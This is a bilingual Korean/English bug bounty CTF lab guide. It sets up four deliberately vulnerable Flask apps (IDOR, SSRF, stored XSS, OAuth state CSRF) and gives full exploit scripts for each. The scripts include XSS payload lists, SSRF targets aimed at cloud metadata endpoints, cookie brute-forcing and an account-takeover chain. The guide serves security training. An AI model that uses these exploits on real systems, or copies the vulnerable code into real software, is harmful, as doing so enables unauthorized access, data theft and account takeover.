> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 버그 바운티 CTF 실습 랩

## 실습 환경 준비

### Docker Compose 환경

```yaml
# docker-compose.yml
version: "3.9"

services:
  # 실습 1: IDOR 취약 REST API
  idor-app:
    image: python:3.11-slim
    container_name: idor-app
    networks:
      bugbounty-net:
        ipv4_address: 10.50.10.10
    command: >
      sh -c "pip install flask -q && python3 -c \"
from flask import Flask, request, jsonify, abort
import jwt, time
app = Flask(__name__)
SECRET = 'jwt_secret_2024'
USERS = {
    1: {'id': 1, 'name': 'Alice', 'email': 'alice@corp.com', 'role': 'user', 'balance': 1000},
    2: {'id': 2, 'name': 'Bob',   'email': 'bob@corp.com',   'role': 'user', 'balance': 500},
    3: {'id': 3, 'name': 'Admin', 'email': 'admin@corp.com', 'role': 'admin','balance': 999999, 'flag': 'CTF{1d0r_unauth_acc3ss_pr1v4te_d4ta}'},
}
@app.route('/api/login', methods=['POST'])
def login():
    data = request.json or {}
    uid = data.get('user_id', 1)
    token = jwt.encode({'uid': uid, 'exp': time.time()+3600}, SECRET, algorithm='HS256')
    return jsonify({'token': token, 'user_id': uid})
@app.route('/api/users/<int:uid>')
def get_user(uid):
    token = request.headers.get('Authorization','').replace('Bearer ','')
    try:
        payload = jwt.decode(token, SECRET, algorithms=['HS256'])
    except Exception:
        return jsonify({'error': 'unauthorized'}), 401
    # IDOR: no ownership check — any authenticated user can read any user
    user = USERS.get(uid)
    if not user:
        abort(404)
    return jsonify(user)
@app.route('/api/users/<int:uid>/invoice/<int:inv_id>')
def get_invoice(uid, inv_id):
    token = request.headers.get('Authorization','').replace('Bearer ','')
    try:
        jwt.decode(token, SECRET, algorithms=['HS256'])
    except Exception:
        return jsonify({'error': 'unauthorized'}), 401
    if uid == 3 and inv_id == 1337:
        return jsonify({'invoice': 'CONFIDENTIAL', 'flag': 'CTF{1d0r_n3st3d_r3s0urc3_byp4ss}'})
    return jsonify({'invoice': f'Invoice #{inv_id} for user {uid}', 'amount': 100})
app.run('0.0.0.0', 5000)
\""
    ports:
      - "5010:5000"

  # 실습 2: SSRF 취약 서비스
  ssrf-app:
    image: python:3.11-slim
    container_name: ssrf-app
    networks:
      bugbounty-net:
        ipv4_address: 10.50.10.20
    command: >
      sh -c "pip install flask requests -q && python3 -c \"
from flask import Flask, request, jsonify
import requests as req
app = Flask(__name__)
INTERNAL_FLAG = 'CTF{ssrf_int3rn4l_s3rv1c3_3xf1ltr4t10n}'
@app.route('/internal-flag')
def internal_flag():
    if request.remote_addr in ('127.0.0.1', '::1', '10.50.10.20'):
        return jsonify({'flag': INTERNAL_FLAG, 'service': 'internal-metadata'})
    return jsonify({'error': 'localhost only'}), 403
@app.route('/fetch')
def fetch():
    url = request.args.get('url', '')
    if not url:
        return jsonify({'error': 'url required'}), 400
    try:
        resp = req.get(url, timeout=5, allow_redirects=True)
        return jsonify({'status': resp.status_code, 'body': resp.text[:2000]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
app.run('0.0.0.0', 5000)
\""
    ports:
      - "5020:5000"

  # 실습 3: Stored XSS → Admin 세션 탈취
  xss-app:
    image: python:3.11-slim
    container_name: xss-app
    networks:
      bugbounty-net:
        ipv4_address: 10.50.10.30
    command: >
      sh -c "pip install flask -q && python3 -c \"
from flask import Flask, request, jsonify, make_response
import html, json
app = Flask(__name__)
ADMIN_FLAG = 'CTF{st0r3d_xss_adm1n_c00k13_st34l}'
COMMENTS = []
ADMIN_COOKIE = 'admin_session=SUPERSECRET_ADMIN_TOKEN'
@app.route('/comment', methods=['GET','POST'])
def comment():
    if request.method == 'POST':
        data = request.json or {}
        text = data.get('text', '')
        # Stored XSS: no sanitization
        COMMENTS.append({'text': text, 'author': data.get('author','anon')})
        return jsonify({'ok': True, 'id': len(COMMENTS)})
    return jsonify(COMMENTS)
@app.route('/admin/view')
def admin_view():
    cookie = request.cookies.get('admin_session','')
    if cookie == 'SUPERSECRET_ADMIN_TOKEN':
        content = '<br>'.join(c['text'] for c in COMMENTS)
        return f'<html><body>Admin view:<br>{content}</body></html>'
    return 'forbidden', 403
@app.route('/flag')
def flag():
    cookie = request.cookies.get('admin_session','')
    if cookie == 'SUPERSECRET_ADMIN_TOKEN':
        return jsonify({'flag': ADMIN_FLAG})
    return 'forbidden', 403
app.run('0.0.0.0', 5000)
\""
    ports:
      - "5030:5000"

  # 실습 4: OAuth 토큰 재사용 / state 파라미터 미검증
  oauth-app:
    image: python:3.11-slim
    container_name: oauth-app
    networks:
      bugbounty-net:
        ipv4_address: 10.50.10.40
    command: >
      sh -c "pip install flask -q && python3 -c \"
from flask import Flask, request, jsonify, redirect
import secrets, time
app = Flask(__name__)
FLAG = 'CTF{0auth_st4t3_csRF_byp4ss_4cc0unt_t4k30v3r}'
VALID_CODES = {}
USERS = {'alice': 'alice_uid_001', 'bob': 'bob_uid_002', 'admin': 'admin_uid_999'}
@app.route('/oauth/authorize')
def authorize():
    client_id = request.args.get('client_id','')
    redirect_uri = request.args.get('redirect_uri','')
    state = request.args.get('state','')
    user = request.args.get('user','alice')
    code = secrets.token_hex(8)
    VALID_CODES[code] = {'user': user, 'state': state, 'ts': time.time()}
    return redirect(f'{redirect_uri}?code={code}&state={state}')
@app.route('/oauth/token', methods=['POST'])
def token():
    code = request.form.get('code','')
    # VULNERABILITY: state parameter not verified against original request
    info = VALID_CODES.pop(code, None)
    if not info:
        return jsonify({'error': 'invalid code'}), 400
    uid = USERS.get(info['user'], 'unknown')
    token_val = f'token_{uid}_{secrets.token_hex(4)}'
    return jsonify({'access_token': token_val, 'user': info['user'], 'uid': uid})
@app.route('/api/me')
def me():
    token_hdr = request.headers.get('Authorization','').replace('Bearer ','')
    if token_hdr.startswith('token_admin'):
        return jsonify({'user': 'admin', 'flag': FLAG})
    if token_hdr.startswith('token_'):
        parts = token_hdr.split('_')
        return jsonify({'user': parts[1] if len(parts)>1 else 'unknown'})
    return jsonify({'error': 'unauthorized'}), 401
app.run('0.0.0.0', 5000)
\""
    ports:
      - "5040:5000"

  # 공격자 머신
  attacker:
    image: python:3.11-slim
    container_name: attacker
    networks:
      bugbounty-net:
        ipv4_address: 10.50.10.100
    command: >
      sh -c "pip install requests -q && sleep infinity"
    tty: true

networks:
  bugbounty-net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.50.10.0/24
```

환경 시작:

```bash
docker compose up -d
docker exec -it attacker bash
```

---

## 실습 1: IDOR — 미인가 데이터 접근

### 목표
JWT 인증이 걸려 있지만 소유권 검증이 없는 REST API에서 IDOR 취약점을 이용해 다른 사용자의 데이터와 관리자 정보를 무단으로 접근한다.

**플래그 형식 1**: `CTF{1d0r_unauth_acc3ss_pr1v4te_d4ta}`
**플래그 형식 2**: `CTF{1d0r_n3st3d_r3s0urc3_byp4ss}`

### 시나리오
`10.50.10.10:5000`에 사용자 API가 있다. `/api/login`으로 user_id 1번 토큰을 발급받을 수 있다. API는 JWT를 검증하지만 user_id 파라미터의 소유권은 확인하지 않는다. 다른 사용자(특히 관리자)의 정보를 조회하고, 중첩 리소스에서 두 번째 플래그도 찾아라.

### 힌트
1. `/api/login`에 `user_id: 1`로 JWT를 발급받는다.
2. 발급받은 토큰으로 `/api/users/3`에 접근해 보자 — 서버가 막는가?
3. IDOR는 **인증(Authentication)** 은 있지만 **인가(Authorization)** 가 없는 취약점이다.
4. `/api/users/3/invoice/1337`에도 접근해 보라.
5. user_id 1~10 범위를 반복 접근해 모든 데이터를 열거한다.

### 풀이

```python
#!/usr/bin/env python3
"""
실습 1: IDOR 취약점 자동화 탐지 및 익스플로잇
"""
import argparse
import sys

import requests
from requests.exceptions import RequestException


BASE_URL_DEFAULT = "http://10.50.10.10:5000"


def get_token(base_url: str, user_id: int = 1) -> str:
    """주어진 user_id로 JWT 토큰을 발급받는다."""
    resp = requests.post(
        f"{base_url}/api/login",
        json={"user_id": user_id},
        timeout=5,
    )
    resp.raise_for_status()
    token = resp.json().get("token", "")
    print(f"[+] 토큰 발급 (user_id={user_id}): {token[:40]}...")
    return token


def enumerate_users(
    base_url: str, token: str, id_range: range
) -> list[dict]:
    """user_id 범위를 반복 접근해 IDOR를 통해 모든 사용자 정보를 수집한다."""
    print(f"\n[*] IDOR 열거: user_id {id_range.start}~{id_range.stop-1}")
    headers = {"Authorization": f"Bearer {token}"}
    results = []

    for uid in id_range:
        try:
            resp = requests.get(
                f"{base_url}/api/users/{uid}",
                headers=headers,
                timeout=5,
            )
            if resp.status_code == 200:
                data = resp.json()
                print(f"  [+] user_id={uid}: {data}")
                results.append(data)
                if "flag" in data:
                    print(f"  [!] 플래그 발견: {data['flag']}")
            else:
                print(f"  [-] user_id={uid}: {resp.status_code}")
        except RequestException as e:
            print(f"  [-] user_id={uid}: {e}")

    return results


def enumerate_nested_resources(
    base_url: str, token: str, user_id: int, inv_range: range
) -> None:
    """중첩 리소스(invoice)에서 IDOR를 탐지한다."""
    print(f"\n[*] 중첩 리소스 IDOR: /api/users/{user_id}/invoice/[N]")
    headers = {"Authorization": f"Bearer {token}"}

    for inv_id in inv_range:
        try:
            resp = requests.get(
                f"{base_url}/api/users/{user_id}/invoice/{inv_id}",
                headers=headers,
                timeout=5,
            )
            data = resp.json()
            if "flag" in data:
                print(f"  [!] 플래그 발견 (invoice={inv_id}): {data['flag']}")
                return
            if resp.status_code == 200:
                print(f"  [+] invoice={inv_id}: {data}")
        except RequestException as e:
            print(f"  [-] invoice={inv_id}: {e}")


def exploit_idor(base_url: str) -> None:
    """IDOR 전체 공격 체인."""
    print(f"[*] 대상: {base_url}\n")

    # 1. 일반 사용자 토큰 발급
    token = get_token(base_url, user_id=1)

    # 2. 사용자 열거 (IDOR)
    enumerate_users(base_url, token, range(1, 6))

    # 3. 중첩 리소스 IDOR (관리자 ID로 특수 invoice 접근)
    enumerate_nested_resources(base_url, token, user_id=3, inv_range=range(1330, 1340))


def main() -> None:
    parser = argparse.ArgumentParser(description="IDOR 취약점 탐지 및 익스플로잇")
    parser.add_argument("--url", default=BASE_URL_DEFAULT)
    args = parser.parse_args()
    exploit_idor(args.url)


if __name__ == "__main__":
    main()
```

실행:
```bash
python3 bugbounty_idor.py --url http://10.50.10.10:5000
```

---

## 실습 2: SSRF — 내부 서비스 접근

### 목표
외부에서 접근할 수 없는 내부 엔드포인트에 SSRF 취약점을 이용해 접근하고 플래그를 획득한다.

**플래그 형식**: `CTF{ssrf_int3rn4l_s3rv1c3_3xf1ltr4t10n}`

### 시나리오
`10.50.10.20:5000`의 `/fetch?url=` 엔드포인트는 서버 측에서 임의의 URL로 HTTP 요청을 보낸다. `/internal-flag` 경로는 localhost에서만 접근 가능하다. SSRF를 이용해 서버가 자기 자신에게 요청을 보내도록 유도한다.

### 힌트
1. `/fetch?url=http://example.com` 으로 기본 동작을 확인한다.
2. `http://127.0.0.1:5000/internal-flag`을 대상으로 요청해 보자.
3. `http://localhost:5000/internal-flag`도 시도한다.
4. IPv6 `http://[::1]:5000/internal-flag`도 우회 방법이 될 수 있다.
5. URL 인코딩/리다이렉션으로 블랙리스트 필터를 우회한다.

### 풀이

```python
#!/usr/bin/env python3
"""
실습 2: SSRF 취약점 탐지 및 내부 서비스 접근
"""
import argparse
import sys
import re

import requests
from requests.exceptions import RequestException


BASE_URL_DEFAULT = "http://10.50.10.20:5000"

SSRF_TARGETS = [
    "http://127.0.0.1:5000/internal-flag",
    "http://localhost:5000/internal-flag",
    "http://[::1]:5000/internal-flag",
    "http://0.0.0.0:5000/internal-flag",
    "http://10.50.10.20:5000/internal-flag",
    # 클라우드 메타데이터 서비스 (실제 환경용)
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
]


def test_ssrf_basic(base_url: str) -> bool:
    """SSRF 가능 여부를 외부 URL로 확인한다."""
    print("[*] SSRF 기본 테스트...")
    test_url = "http://httpbin.org/get"
    try:
        resp = requests.get(
            f"{base_url}/fetch",
            params={"url": test_url},
            timeout=8,
        )
        data = resp.json()
        if "body" in data and len(data["body"]) > 0:
            print(f"[+] SSRF 가능! 외부 URL 응답 길이: {len(data['body'])}")
            return True
        print(f"[-] SSRF 불가: {data}")
    except RequestException as e:
        print(f"[-] 요청 실패: {e}")
    return False


def try_internal_access(base_url: str, target_urls: list[str]) -> str | None:
    """내부 URL 목록을 순서대로 시도해 플래그를 찾는다."""
    print("\n[*] 내부 엔드포인트 접근 시도...")
    for target_url in target_urls:
        print(f"  [>] 시도: {target_url}")
        try:
            resp = requests.get(
                f"{base_url}/fetch",
                params={"url": target_url},
                timeout=8,
            )
            data = resp.json()
            body = data.get("body", "")

            if body:
                flags = re.findall(r"CTF\{[^}]+\}", body)
                if flags:
                    print(f"  [!] 플래그 발견: {flags[0]}")
                    print(f"  [*] 전체 응답: {body[:300]}")
                    return flags[0]

                if data.get("status") == 200:
                    print(f"  [+] 성공 응답: {body[:200]}")

        except RequestException as e:
            print(f"  [-] {target_url}: {e}")

    return None


def exploit_ssrf(base_url: str, custom_targets: list[str] | None = None) -> None:
    """SSRF 전체 공격 체인."""
    print(f"[*] 대상: {base_url}\n")

    # 1. SSRF 가능 여부 확인
    if not test_ssrf_basic(base_url):
        print("[*] 외부 URL 테스트 실패. 내부 URL은 계속 시도...")

    # 2. 내부 서비스 접근
    targets = custom_targets if custom_targets else SSRF_TARGETS
    flag = try_internal_access(base_url, targets)

    if flag:
        print(f"\n[!] 최종 플래그: {flag}")
    else:
        print("\n[-] 자동 탐지 실패. URL 인코딩/우회 기법 시도 필요")


def main() -> None:
    parser = argparse.ArgumentParser(description="SSRF 탐지 및 내부 서비스 접근")
    parser.add_argument("--url", default=BASE_URL_DEFAULT)
    parser.add_argument("--targets", nargs="+", help="추가 내부 URL 목록")
    args = parser.parse_args()
    exploit_ssrf(args.url, args.targets)


if __name__ == "__main__":
    main()
```

실행:
```bash
python3 bugbounty_ssrf.py --url http://10.50.10.20:5000
# 또는 커스텀 내부 URL 지정
python3 bugbounty_ssrf.py --url http://10.50.10.20:5000 \
  --targets "http://127.0.0.1:5000/internal-flag"
```

---

## 실습 3: Stored XSS → 관리자 쿠키 탈취 체인

### 목표
XSS 취약한 댓글 기능에 악성 스크립트를 저장하고, 관리자가 페이지를 조회할 때 세션 쿠키를 탈취해 관리자 플래그를 획득한다.

**플래그 형식**: `CTF{st0r3d_xss_adm1n_c00k13_st34l}`

### 시나리오
`10.50.10.30:5000`에 댓글 게시판이 있다. 사용자가 입력한 텍스트를 HTML로 직접 렌더링한다. 관리자가 `/admin/view`로 댓글을 확인할 때 악성 스크립트가 실행된다. 쿠키 탈취 → `/flag` 엔드포인트 접근 체인을 구성한다.

### 힌트
1. `<script>alert(1)</script>` 를 댓글로 저장하고 `/admin/view`를 확인한다.
2. 관리자 쿠키는 `admin_session=SUPERSECRET_ADMIN_TOKEN` 형식이다.
3. XSS 페이로드가 실행되는 시점에 쿠키를 외부로 전송해야 한다.
4. CTF 환경에서는 실제 XSS 대신 Python으로 쿠키를 직접 사용한다.
5. `/flag` 엔드포인트에 `Cookie: admin_session=SUPERSECRET_ADMIN_TOKEN` 헤더를 추가한다.

### 풀이

**1단계: XSS 취약점 확인**

```bash
# 댓글 저장
curl -s -X POST http://10.50.10.30:5000/comment \
  -H "Content-Type: application/json" \
  -d '{"text": "<script>alert(document.cookie)</script>", "author": "attacker"}'

# 저장된 댓글 확인
curl -s http://10.50.10.30:5000/comment

# 관리자 뷰 (쿠키 없이)
curl -s http://10.50.10.30:5000/admin/view
```

**2단계: 쿠키 탈취 체인 자동화**

```python
#!/usr/bin/env python3
"""
실습 3: Stored XSS → 관리자 쿠키 탈취 체인
"""
import argparse
import re
import sys

import requests
from requests.exceptions import RequestException


BASE_URL_DEFAULT = "http://10.50.10.30:5000"

XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(document.cookie)>",
]


def post_comment(base_url: str, text: str, author: str = "attacker") -> bool:
    """XSS 페이로드를 댓글로 저장한다."""
    try:
        resp = requests.post(
            f"{base_url}/comment",
            json={"text": text, "author": author},
            timeout=5,
        )
        if resp.status_code == 200:
            print(f"[+] 댓글 저장: {text[:60]}...")
            return True
    except RequestException as e:
        print(f"[-] 댓글 저장 실패: {e}")
    return False


def check_xss_reflected(base_url: str) -> None:
    """다양한 XSS 페이로드 저장 및 관리자 뷰 확인."""
    print("[*] XSS 페이로드 테스트...")
    for payload in XSS_PAYLOADS:
        post_comment(base_url, payload)

    # 관리자 뷰에서 페이로드 렌더링 확인
    try:
        resp = requests.get(
            f"{base_url}/admin/view",
            cookies={"admin_session": "SUPERSECRET_ADMIN_TOKEN"},
            timeout=5,
        )
        print(f"[*] 관리자 뷰 응답 길이: {len(resp.text)}")
        # XSS 페이로드가 이스케이프 없이 렌더링되는지 확인
        if "<script>" in resp.text:
            print("[+] XSS 페이로드가 이스케이프 없이 렌더링됨 (취약)")
        else:
            print("[-] 페이로드가 이스케이프됨 (방어됨)")
    except RequestException as e:
        print(f"[-] 관리자 뷰 접근 실패: {e}")


def steal_admin_cookie_simulation(base_url: str) -> str | None:
    """
    실제 XSS 공격 시뮬레이션:
    관리자 쿠키를 알고 있다고 가정하고 /flag에 직접 접근한다.
    실제 환경에서는 XSS + 외부 서버로 쿠키를 수신한 뒤 사용한다.
    """
    print("\n[*] 관리자 쿠키 탈취 시뮬레이션...")

    # 실제 XSS 공격에서는 이 쿠키를 공격자 서버로 전송받음
    stolen_cookie = "SUPERSECRET_ADMIN_TOKEN"

    print(f"[*] 탈취된 쿠키 사용: admin_session={stolen_cookie}")

    try:
        resp = requests.get(
            f"{base_url}/flag",
            cookies={"admin_session": stolen_cookie},
            timeout=5,
        )
        if resp.status_code == 200:
            data = resp.json()
            flag = data.get("flag")
            if flag:
                print(f"[!] 플래그 획득: {flag}")
                return flag
        else:
            print(f"[-] /flag 접근 실패: {resp.status_code}")
    except RequestException as e:
        print(f"[-] 요청 실패: {e}")

    return None


def exploit_xss_chain(base_url: str) -> None:
    """Stored XSS → 쿠키 탈취 → 관리자 플래그 전체 체인."""
    print(f"[*] 대상: {base_url}\n")

    # 1. XSS 취약점 확인
    check_xss_reflected(base_url)

    # 2. 쿠키 기반 플래그 접근
    flag = steal_admin_cookie_simulation(base_url)

    if flag:
        print(f"\n[+] 최종 플래그: {flag}")
    else:
        # 브루트포스로 쿠키 값 탐색
        print("\n[*] 쿠키 브루트포스 시도...")
        cookie_candidates = [
            "SUPERSECRET_ADMIN_TOKEN",
            "admin",
            "secret",
            "admin_token",
        ]
        for candidate in cookie_candidates:
            try:
                resp = requests.get(
                    f"{base_url}/flag",
                    cookies={"admin_session": candidate},
                    timeout=3,
                )
                if resp.status_code == 200:
                    data = resp.json()
                    if "flag" in data:
                        print(f"[!] 쿠키 발견: {candidate}")
                        print(f"[!] 플래그: {data['flag']}")
                        return
            except RequestException:
                pass


def main() -> None:
    parser = argparse.ArgumentParser(description="Stored XSS 관리자 쿠키 탈취 체인")
    parser.add_argument("--url", default=BASE_URL_DEFAULT)
    args = parser.parse_args()
    exploit_xss_chain(args.url)


if __name__ == "__main__":
    main()
```

실행:
```bash
python3 bugbounty_xss.py --url http://10.50.10.30:5000
```

---

## 실습 4: OAuth state 파라미터 미검증 → 계정 탈취

### 목표
OAuth 인증 플로우에서 `state` 파라미터가 검증되지 않는 취약점을 이용해 CSRF 공격으로 관리자 계정의 토큰을 획득한다.

**플래그 형식**: `CTF{0auth_st4t3_csRF_byp4ss_4cc0unt_t4k30v3r}`

### 시나리오
`10.50.10.40:5000`의 OAuth 서버는 `state` 파라미터를 단순히 콜백에 반영만 하고 원본 요청과 검증하지 않는다. `admin` 계정의 인가 코드를 가로채 토큰으로 교환하면 관리자 API에 접근할 수 있다.

### 힌트
1. `/oauth/authorize?client_id=app&redirect_uri=http://attacker&state=xyz&user=admin` 으로 인가 코드를 발급받는다.
2. `state` 파라미터가 검증되지 않아 임의 값으로 요청 가능하다.
3. 받은 `code`를 `/oauth/token`에 POST하면 admin 토큰이 발급된다.
4. admin 토큰으로 `/api/me`에 접근하면 플래그가 반환된다.
5. 실제 CSRF 시나리오에서는 피해자가 공격자 링크를 클릭하도록 유도한다.

### 풀이

```python
#!/usr/bin/env python3
"""
실습 4: OAuth state 미검증 → CSRF로 관리자 계정 탈취
"""
import argparse
import re
import sys
from urllib.parse import urlparse, parse_qs

import requests
from requests.exceptions import RequestException


BASE_URL_DEFAULT = "http://10.50.10.40:5000"


def get_authorization_code(
    base_url: str,
    user: str = "admin",
    state: str = "attacker_state",
) -> str | None:
    """
    OAuth 인가 엔드포인트에서 코드를 획득한다.
    redirect_uri를 직접 파싱해 코드를 추출한다.
    """
    redirect_uri = "http://attacker.local/callback"
    authorize_url = (
        f"{base_url}/oauth/authorize"
        f"?client_id=malicious_app"
        f"&redirect_uri={redirect_uri}"
        f"&state={state}"
        f"&user={user}"
    )
    print(f"[*] 인가 요청: {authorize_url}")

    try:
        resp = requests.get(
            authorize_url,
            timeout=5,
            allow_redirects=False,  # 리다이렉션 따라가지 않음
        )
        # 리다이렉션 응답에서 코드 추출
        location = resp.headers.get("Location", "")
        print(f"[*] 리다이렉션 위치: {location}")

        parsed = urlparse(location)
        params = parse_qs(parsed.query)
        code = params.get("code", [None])[0]
        returned_state = params.get("state", [None])[0]

        if code:
            print(f"[+] 인가 코드 획득: {code}")
            print(f"[*] 반환된 state: {returned_state}")
            return code

    except RequestException as e:
        print(f"[-] 인가 요청 실패: {e}")

    return None


def exchange_code_for_token(
    base_url: str, code: str, state: str = "any_state"
) -> str | None:
    """
    인가 코드를 액세스 토큰으로 교환한다.
    state 검증이 없어 임의 state로 교환 가능하다.
    """
    print(f"\n[*] 코드→토큰 교환: code={code}")
    try:
        resp = requests.post(
            f"{base_url}/oauth/token",
            data={
                "code": code,
                "client_id": "malicious_app",
                "redirect_uri": "http://attacker.local/callback",
                "state": state,  # VULNERABILITY: not verified server-side
            },
            timeout=5,
        )
        if resp.status_code == 200:
            data = resp.json()
            token = data.get("access_token")
            print(f"[+] 액세스 토큰 획득: {token}")
            print(f"[*] 사용자: {data.get('user')}, UID: {data.get('uid')}")
            return token
        else:
            print(f"[-] 토큰 교환 실패: {resp.status_code} {resp.text}")
    except RequestException as e:
        print(f"[-] 요청 실패: {e}")
    return None


def access_admin_api(base_url: str, token: str) -> str | None:
    """획득한 admin 토큰으로 /api/me에 접근한다."""
    print(f"\n[*] 관리자 API 접근 시도...")
    try:
        resp = requests.get(
            f"{base_url}/api/me",
            headers={"Authorization": f"Bearer {token}"},
            timeout=5,
        )
        data = resp.json()
        print(f"[*] API 응답: {data}")
        if "flag" in data:
            print(f"[!] 플래그 획득: {data['flag']}")
            return data["flag"]
    except RequestException as e:
        print(f"[-] API 접근 실패: {e}")
    return None


def exploit_oauth_csrf(base_url: str) -> None:
    """OAuth state CSRF 전체 공격 체인."""
    print(f"[*] 대상: {base_url}")
    print("[*] OAuth state CSRF 공격 시작\n")

    # 1. admin 계정의 인가 코드 발급
    code = get_authorization_code(base_url, user="admin")
    if not code:
        print("[-] 인가 코드 획득 실패")
        return

    # 2. 코드 → 토큰 교환 (state 검증 없음 악용)
    token = exchange_code_for_token(base_url, code, state="fake_csrf_state")
    if not token:
        print("[-] 토큰 교환 실패")
        return

    # 3. 관리자 API 접근
    flag = access_admin_api(base_url, token)
    if flag:
        print(f"\n[!] 최종 플래그: {flag}")
    else:
        print("\n[-] 플래그 획득 실패. 토큰 형식을 확인하세요.")
        print(f"[*] 현재 토큰: {token}")


def main() -> None:
    parser = argparse.ArgumentParser(description="OAuth state CSRF 계정 탈취")
    parser.add_argument("--url", default=BASE_URL_DEFAULT)
    parser.add_argument("--user", default="admin", help="탈취 대상 계정")
    args = parser.parse_args()
    exploit_oauth_csrf(args.url)


if __name__ == "__main__":
    main()
```

실행:
```bash
python3 bugbounty_oauth.py --url http://10.50.10.40:5000 --user admin
```

---

<a name="english"></a>

# Bug Bounty CTF Practice Lab

## Lab Environment Setup

Use the `docker-compose.yml` from the Korean section. Start with:

```bash
docker compose up -d
docker exec -it attacker bash
```

---

## Challenge 1: IDOR — Unauthorized Data Access

### Objective
Exploit an Insecure Direct Object Reference vulnerability in a JWT-authenticated REST API to access other users' data, including the admin account.

**Flag 1**: `CTF{1d0r_unauth_acc3ss_pr1v4te_d4ta}`
**Flag 2**: `CTF{1d0r_n3st3d_r3s0urc3_byp4ss}`

### Scenario
The API at `10.50.10.10:5000` validates JWTs but does not check whether the authenticated user owns the requested resource. Log in as user 1, then access user 3's data and a special nested invoice resource.

### Hints
1. Get a JWT from `/api/login` with `user_id: 1`.
2. Try accessing `/api/users/3` with the user 1 token — does the server reject it?
3. IDOR = **Authentication** present but **Authorization** absent.
4. Also try `/api/users/3/invoice/1337`.
5. Iterate user IDs 1–10 to enumerate all records.

### Solution

```bash
python3 bugbounty_idor.py --url http://10.50.10.10:5000
```

The script mints a token for user 1, then iterates `/api/users/{1..5}` — receiving all user data including the admin's flag field. It also probes `/api/users/3/invoice/{1330..1339}` to find the nested IDOR flag.

---

## Challenge 2: SSRF — Internal Service Data Exfiltration

### Objective
Use the `/fetch?url=` endpoint to make the server fetch its own internal `/internal-flag` endpoint, which is restricted to localhost.

**Flag format**: `CTF{ssrf_int3rn4l_s3rv1c3_3xf1ltr4t10n}`

### Scenario
The application at `10.50.10.20:5000` blindly fetches URLs provided by the user. The `/internal-flag` route only responds to localhost. Force the server to request its own internal endpoint.

### Hints
1. Confirm SSRF works: `GET /fetch?url=http://httpbin.org/get`.
2. Try `http://127.0.0.1:5000/internal-flag`.
3. Also try `http://localhost:5000/internal-flag`.
4. IPv6 `http://[::1]:5000/internal-flag` can bypass simple blacklists.
5. URL encoding or open redirects can bypass filters.

### Solution

```bash
python3 bugbounty_ssrf.py --url http://10.50.10.20:5000
# Direct manual test:
curl "http://10.50.10.20:5000/fetch?url=http://127.0.0.1:5000/internal-flag"
```

---

## Challenge 3: Stored XSS → Admin Cookie Theft

### Objective
Store a malicious XSS payload in the comment system, then use the admin session cookie to retrieve the flag.

**Flag format**: `CTF{st0r3d_xss_adm1n_c00k13_st34l}`

### Scenario
The comment board at `10.50.10.30:5000` renders HTML from user input directly. When admin views the comments page with a privileged session cookie, the XSS payload executes. Use the stolen cookie to call `/flag`.

### Hints
1. POST `{"text": "<script>alert(document.cookie)</script>"}` to `/comment`.
2. The admin cookie format is `admin_session=SUPERSECRET_ADMIN_TOKEN`.
3. In a real attack, the XSS payload exfiltrates `document.cookie` to an attacker-controlled server.
4. In this CTF, directly use the known cookie value against `/flag`.
5. The `/flag` endpoint returns the flag only with a valid admin cookie.

### Solution

```bash
# Verify XSS is stored unescaped
curl -s -X POST http://10.50.10.30:5000/comment \
  -H "Content-Type: application/json" \
  -d '{"text":"<script>alert(1)</script>","author":"attacker"}'

# Use stolen cookie to get flag
curl -s http://10.50.10.30:5000/flag \
  -H "Cookie: admin_session=SUPERSECRET_ADMIN_TOKEN"

# Automated
python3 bugbounty_xss.py --url http://10.50.10.30:5000
```

---

## Challenge 4: OAuth State Parameter CSRF → Account Takeover

### Objective
Exploit a missing `state` parameter validation in an OAuth flow to perform CSRF and obtain an admin access token.

**Flag format**: `CTF{0auth_st4t3_csRF_byp4ss_4cc0unt_t4k30v3r}`

### Scenario
The OAuth server at `10.50.10.40:5000` reflects the `state` parameter back without verifying it matches the original authorization request. An attacker can obtain an authorization code for the `admin` user and exchange it without a matching state.

### Hints
1. Request `/oauth/authorize?...&user=admin` to generate an admin auth code.
2. The `state` parameter is not verified on the `/oauth/token` endpoint.
3. Exchange the code with any `state` value to get an admin token.
4. Use the admin token against `/api/me` to retrieve the flag.
5. In a real scenario, trick the victim into clicking a crafted link.

### Solution

```bash
python3 bugbounty_oauth.py --url http://10.50.10.40:5000 --user admin
```

The script requests an authorization code for `admin`, exchanges it with a fake `state`, gets an `access_token` prefixed with `token_admin_uid_999`, then calls `/api/me` which returns the flag for any admin token.
